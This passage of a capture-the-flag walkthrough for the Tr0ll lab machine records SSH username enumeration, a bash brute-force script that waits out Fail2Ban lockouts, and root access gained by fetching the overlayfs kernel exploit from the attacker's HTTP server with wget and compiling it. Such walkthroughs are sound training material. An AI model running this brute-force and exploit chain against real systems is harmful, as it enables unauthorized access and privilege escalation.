+<div>Well, we have a list of words now. There seems to be some indication one of these words is the password. It is also possible one of these words is a username. We've only seen the username "anonymous" used on the FTP service (by us and in the lol.pcap file). The only other service to try to login to is the SSH service. Before doing that, though, we need to figure out some usernames. Maybe we can use one of the "Username Enumeration" scripts in the exploit database.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                     | exploits/linux/remote/45233.py</div>
+    <div>OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                                                               | exploits/linux/remote/45210.py</div>
+    <div>OpenSSH &lt; 7.7 - User Enumeration (2)                                                                         | exploits/linux/remote/45939.py</div>
+</div>
+<div><br /></div>
+<div>I'll start with the "newest" exploit (highest number). I'll copy it to my working directory and see what the script parameters are.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# cp /usr/share/exploitdb/exploits/linux/remote/45939.py .</div>
+    <div>root@kali:~/Walkthroughs/tr0ll# python 45939.py </div>
+    <div>usage: 45939.py [-h] [-p PORT] target username</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>SSH User Enumeration by Leap Security (@LeapSecurity)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>positional arguments:</div>
+    <div>  target                IP address of the target system</div>
+    <div>  username              Username to check for validity.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>optional arguments:</div>
+    <div>  -h, --help            show this help message and exit</div>
+    <div>  -p PORT, --port PORT  Set port of SSH service</div>
+</div>
+<div><br /></div>
+<div>Looks like we just need to pass it a target and username. It doesn't seem to handle a list of usernames, so we'll have to run it in a loop to check multiple. We'll start by checking to see if any of the entries in our wordlists are valid usernames.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# for word in $(cat wordlist)</div>
+    <div>&gt; do</div>
+    <div>&gt; python 45939.py 10.183.0.218 "$word"</div>
+    <div>&gt; done</div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] maleus is a valid username</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] ps-aux is a valid username</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] felux is a valid username</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] Eagle11 is a valid username</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] genphlux is a valid username</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] usmc8892 is a valid username</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] blawrg is a valid username</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] wytshadow is a valid username</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] vis1t0r is a valid username</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] overflow is a valid username</font>
+    </div>
+    <div>[-] Good_job_:) is an invalid username</div>
+</div>
+<div><br /></div>
+<div>Looks like all the words in the "which_one_lol.txt" file are valid usernames. I tried to run hydra against the SSH service using our wordlist for both usernames and passwords. Unfortunately, no valid combinations were detected. 😞</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>hydra -o ssh-crack -t 4 -L wordlist -u -e nsr -P wordlist ssh://10.183.0.218</div>
+</div>
+<div><br /></div>
+<div>However, it looks like the SSH service is pretty sensitive to brute force attacks. Using the following script...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>for i in $(seq 1 120); do echo $i `python 45939.py 10.183.0.218 test 2&gt;/dev/null`; sleep 1; done</div>
+</div>
+<div><br /></div>
+<div>...I was able to determine that the service locks down after 6 failed login attempts and won't let you connect for ~60 seconds.</div>
+<div><br /></div>
+<div>Instead of hydra, I decided to create a bash script that would use sshpass to try to login to the SSH service. I have several valid usernames to try. Now I need to create a password wordlist. To build the wordlist, I combined both TXT files we downloaded, plus the names of the files, plus some of the other strings we've seen so far. Hopefully something we've come across so far will be a valid password.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# cat wordlist </div>
+    <div>maleus</div>
+    <div>ps-aux</div>
+    <div>felux</div>
+    <div>Eagle11</div>
+    <div>genphlux</div>
+    <div>usmc8892</div>
+    <div>blawrg</div>
+    <div>wytshadow</div>
+    <div>vis1t0r</div>
+    <div>overflow</div>
+    <div>Good_job_:)</div>
+    <div>which_one_lol.txt</div>
+    <div>which_one_lol</div>
+    <div>Pass.txt</div>
+    <div>Pass</div>
+    <div>good_luck</div>
+    <div>this_folder_contains_the_password</div>
+    <div>0x0856BF</div>
+    <div>Find address 0x0856BF to proceed</div>
+    <div>roflmao</div>
+    <div>sup3rs3cr3tdirlol</div>
+    <div>secret</div>
+    <div>hacker</div>
+    <div>troll</div>
+    <div>tr0ll</div>
+</div>
+<div><br /></div>
+<div>I also inverted the list of usernames we were given. It is pretty common in these challenges for the "right" thing you need to be at the bottom of the list. I used the "tac" command to reverse the order.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# tac usernames &gt; usernames-reverse</div>
+    <div>root@kali:~/Walkthroughs/tr0ll# cat usernames-reverse </div>
+    <div>overflow</div>
+    <div>vis1t0r</div>
+    <div>wytshadow</div>
+    <div>blawrg</div>
+    <div>usmc8892</div>
+    <div>genphlux</div>
+    <div>Eagle11</div>
+    <div>felux</div>
+    <div>ps-aux</div>
+    <div>maleus</div>
+</div>
+<div><br /></div>
+<div>Here's the script I used to loop through each username and password.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# cat ssh-brute.sh </div>
+    <div>#!/bin/bash</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># allow glob matching in case statement</div>
+    <div>shopt -s extglob</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># define colors</div>
+    <div>RED='\033[0;31m'</div>
+    <div>GREEN='\033[0;32m'</div>
+    <div>ORANGE='\033[0;33m'</div>
+    <div>CYAN='\033[0;36m'</div>
+    <div>NC='\033[0m'</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># perform login attempt and check response</div>
+    <div>function login_attempt() {</div>
+    <div>    RESPONSE=$(sshpass -p "$2" ssh $1@10.183.0.218 'exit' 2&gt;&amp;1)</div>
+    <div>    case "$RESPONSE" in</div>
+    <div>        *Connection*)</div>
+    <div>            print_warn "Sleeping 10 seconds..."</div>
+    <div>            sleep 10</div>
+    <div>            return 1</div>
+    <div>        ;;</div>
+    <div>        *Permission*)</div>
+    <div>            print_fail "$1 : $2"</div>
+    <div>            return 0</div>
+    <div>        ;;</div>
+    <div>        *)</div>
+    <div>            print_success "$1 : $2"</div>
+    <div>            print_info "$RESPONSE"</div>
+    <div>            exit</div>
+    <div>        ;;</div>
+    <div>    esac</div>
+    <div>}</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># add pretty print functions</div>
+    <div>function print_info { echo -e "${CYAN}[?]${NC} $1"; }</div>
+    <div>function print_warn { echo -e "${ORANGE}[*]${NC} $1"; }</div>
+    <div>function print_fail { echo -e "${RED}[-]${NC} $1"; }</div>
+    <div>function print_success { echo -e "${GREEN}[+]${NC} $1"; }</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># load usernames from list</div>
+    <div>USERS=($(cat usernames-reverse))</div>
+    <div>print_info "Loaded ${#USERS[@]} users from wordlist"</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># load words from wordlist</div>
+    <div>WORDS=($(cat wordlist))</div>
+    <div>print_info "Loaded ${#WORDS[@]} words from wordlist"</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># start trying username/password combinations</div>
+    <div>for username in "${USERS[@]}"; do</div>
+    <div>    for password in "${WORDS[@]}"; do</div>
+    <div>        until login_attempt "$username" "$password"; do : ; done</div>
+    <div>    done</div>
+    <div>done</div>
+</div>
+<div><br /></div>
+<div>Running the script...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# ./ssh-brute.sh</div>
+    <div>[?] Loaded 10 users from wordlist</div>
+    <div>[?] Loaded 29 words from wordlist</div>
+    <div>[-] overflow : maleus</div>
+    <div>[-] overflow : ps-aux</div>
+    <div>[-] overflow : felux</div>
+    <div>[-] overflow : Eagle11</div>
+    <div>[-] overflow : genphlux</div>
+    <div>[-] overflow : usmc8892</div>
+    <div>[-] overflow : blawrg</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[-] overflow : wytshadow</div>
+    <div>[-] overflow : vis1t0r</div>
+    <div>[-] overflow : overflow</div>
+    <div>[-] overflow : Good_job_:)</div>
+    <div>[-] overflow : which_one_lol.txt</div>
+    <div>[-] overflow : which_one_lol</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>[*] Sleeping 10 seconds...</div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[+] overflow : Pass.txt</font>
+    </div>
+    <div>[?] Could not chdir to home directory /home/overflow: No such file or directory</div>
+</div>
+<div><br /></div>
+<div>Looks like we found a valid username/password combination. 😄 I guess, quite literally, the "this_folder_contains_the_password" folder contained the password... Pass.txt.</div>
+<div><br /></div>
+<div>Let's try to login with the overflow account.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# ssh overflow@10.183.0.218</div>
+    <div>overflow@10.183.0.218's password: </div>
+    <div>Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div> * Documentation:  https://help.ubuntu.com/</div>
+    <div>New release '16.04.6 LTS' available.</div>
+    <div>Run 'do-release-upgrade' to upgrade to it.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>The programs included with the Ubuntu system are free software;</div>
+    <div>the exact distribution terms for each program are described in the</div>
+    <div>individual files in /usr/share/doc/*/copyright.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</div>
+    <div>applicable law.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>The programs included with the Ubuntu system are free software;</div>
+    <div>the exact distribution terms for each program are described in the</div>
+    <div>individual files in /usr/share/doc/*/copyright.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</div>
+    <div>applicable law.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Last login: Mon May 20 10:55:11 2019 from kali.homenet.dom</div>
+    <div>Could not chdir to home directory /home/overflow: No such file or directory</div>
+    <div>$ id</div>
+    <div>uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)</div>
+    <div>                                                                               </div>
+    <div>Broadcast Message from root@trol                                               </div>
+    <div>        (somewhere) at 11:05 ...                                               </div>
+    <div>                                                                               </div>
+    <div>TIMES UP LOL!                                                                  </div>
+    <div>                                                                               </div>
+    <div>Connection to 10.183.0.218 closed by remote host.</div>
+    <div>Connection to 10.183.0.218 closed.</div>
+</div>
+<div><br /></div>
+<div>We're in! Briefly! Looks like we are going to get booted every so often. Doing some testing, the /tmp directory gets cleared and any processes we start are killed as well. This will be fun.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Maintaining Access</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Privilege Escalation</h2>
+</div>
+<div><br /></div>
+<div>Checking the installed kernel and operating system...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>$ uname -a</div>
+    <div>Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux</div>
+    <div>$ cat /etc/os*</div>
+    <div>NAME="Ubuntu"</div>
+    <div>VERSION="14.04.1 LTS, Trusty Tahr"</div>
+    <div>ID=ubuntu</div>
+    <div>ID_LIKE=debian</div>
+    <div>PRETTY_NAME="Ubuntu 14.04.1 LTS"</div>
+    <div>VERSION_ID="14.04"</div>
+    <div>HOME_URL="http://www.ubuntu.com/"</div>
+    <div>SUPPORT_URL="http://help.ubuntu.com/"</div>
+    <div>BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"</div>
+    <div>$ cat /etc/issue*</div>
+    <div>Ubuntu 14.04.1 LTS \n \l</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Ubuntu 14.04.1 LTS</div>
+</div>
+<div><br /></div>
+<div>We have a well-known exploit we've had success using in the past.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation         | exploits/linux/local/37292.c</div>
+</div>
+<div><br /></div>
+<div>I'll copy the exploit to my working directory and then serve it up to the victim using python's SimpleHTTPServer.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# cp /usr/share/exploitdb/exploits/linux/local/37292.c .</div>
+    <div>root@kali:~/Walkthroughs/tr0ll# python -m SimpleHTTPServer 4321</div>
+    <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
+    <div>10.183.0.218 - - [20/May/2019 13:23:18] "GET /37292.c HTTP/1.1" 200 -</div>
+</div>
+<div><br /></div>
+<div>Then, on the victim...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>$ cd /tmp</div>
+    <div>$ wget -O 37292.c 10.183.0.222:4321/37292.c</div>
+    <div>--2019-05-20 11:23:19--  http://10.183.0.222:4321/37292.c</div>
+    <div>Connecting to 10.183.0.222:4321... connected.</div>
+    <div>HTTP request sent, awaiting response... 200 OK</div>
+    <div>Length: 5119 (5.0K) [text/plain]</div>
+    <div>Saving to: '37292.c'</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>100%[============================================================================================================&gt;] 5,119       --.-K/s   in 0s      </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>2019-05-20 11:23:19 (427 MB/s) - '37292.c' saved [5119/5119]</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>$ gcc -o pwn 37292.c</div>
+    <div>$ ./pwn</div>
+    <div>spawning threads</div>
+    <div>mount #1</div>
+    <div>mount #2</div>
+    <div>child threads done</div>
+    <div>/etc/ld.so.preload created</div>
+    <div>creating shared library</div>
+    <div># ls /root</div>
+    <div>proof.txt</div>
+    <div># cat /root/proof.txt</div>
+    <div>Good job, you did it! </div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>702a8c18d29c6f3ca0d99ef5712bfbdc</div>
+</div>
+<div><br /></div>
+<div>Nice! We had to work fast, but we got root... and the proof.txt file.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Clean Up</h2>
+</div>
+<div><br /></div>
+<div>We'll let the "cleaner" clean up after us. 😄</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><span style="font-weight: bold;">Cleaner</span></div>
+<div><br /></div>
+<div>Checking in root's crontab, we see the scripts that are running to boot us and clean up after us.</div>
+<div><br /></div>
+<div class="note"><b>NOTE:</b> The crontab file itself is saved at /var/spool/cron/crontabs/root.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div># crontab -l</div>
+    <div># Edit this file to introduce tasks to be run by cron.</div>
+    <div>#</div>
+    <div># Each task to run has to be defined through a single line</div>
+    <div># indicating with different fields when the task will be run</div>
+    <div># and what command to run for the task</div>
+    <div>#</div>
+    <div># To define the time you can provide concrete values for</div>
+    <div># minute (m), hour (h), day of month (dom), month (mon),</div>
+    <div># and day of week (dow) or use '*' in these fields (for 'any').#</div>
+    <div># Notice that tasks will be started based on the cron's system</div>
+    <div># daemon's notion of time and timezones.</div>
+    <div>#</div>
+    <div># Output of the crontab jobs (including errors) is sent through</div>
+    <div># email to the user the crontab file belongs to (unless redirected).</div>
+    <div>#</div>
+    <div># For example, you can run a backup of all your user accounts</div>
+    <div># at 5 a.m every week with:</div>
+    <div># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</div>
+    <div>#</div>
+    <div># For more information see the manual pages of crontab(5) and cron(8)</div>
+    <div>#</div>
+    <div># m h  dom mon dow   command</div>
+    <div>*/5 * * * * /usr/bin/python /opt/lmao.py</div>
+    <div>*/2 * * * * /usr/bin/python /lib/log/cleaner.py</div>
+</div>
+<div><br /></div>
+<div>The lmao.py file contains the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@troll:/# cat /opt/lmao.py </div>
+    <div>#!/usr/bin/env python</div>
+    <div>import os</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>os.system('echo "TIMES UP LOL!"|wall')</div>
+    <div>os.system("pkill -u 'overflow'")</div>
+    <div>sys.exit()</div>
+</div>
+<div><br /></div>
+<div>The cleaner.py file contains the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@troll:/# cat /lib/log/cleaner.py </div>
+    <div>#!/usr/bin/env python</div>
+    <div>import os</div>
+    <div>import sys</div>
+    <div>try:</div>
+    <div>        os.system('rm -r /tmp/* ')</div>
+    <div>except:</div>
+    <div>        sys.exit()</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><b>Fail2Ban</b></div>
+<div><br /></div>
+<div>Fail2Ban was being used to block our SSH attempts after 6 failed logins. Thankfully the default "bantime" was only 60 seconds.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@troll:~# cat /etc/fail2ban/jail.local</div>
+    <div># Fail2Ban configuration file.</div>
+    <div>#</div>
+    <div># This file was composed for Debian systems from the original one</div>
+    <div># provided now under /usr/share/doc/fail2ban/examples/jail.conf</div>
+    <div># for additional examples.</div>
+    <div>#</div>
+    <div># Comments: use '#' for comment lines and ';' for inline comments</div>
+    <div>#</div>
+    <div># To avoid merges during upgrades DO NOT MODIFY THIS FILE</div>
+    <div># and rather provide your changes in /etc/fail2ban/jail.local</div>
+    <div>#</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># The DEFAULT allows a global definition of the options. They can be overridden</div>
+    <div># in each jail afterwards.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[DEFAULT]</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># "ignoreip" can be an IP address, a CIDR mask or a DNS host. Fail2ban will not</div>
+    <div># ban a host which matches an address in this list. Several addresses can be</div>
+    <div># defined using space separator.</div>
+    <div>ignoreip = 127.0.0.1/8</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># "bantime" is the number of seconds that a host is banned.</div>
+    <div>bantime  = 60 </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div># A host is banned if it has generated "maxretry" during the last "findtime"</div>
+    <div># seconds.</div>
+    <div>findtime = 600</div>
+    <div>maxretry = 3  </div>
+    <div>
+        <div><br /></div>
+        <div>[...snip...]</div>
+    </div>
+    <div><br /></div>
+    <div>[ssh]</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>enabled  = true</div>
+    <div>port     = ssh</div>
+    <div>filter   = sshd</div>
+    <div>logpath  = /var/log/auth.log</div>
+    <div>maxretry = 6  </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div><br /></div>
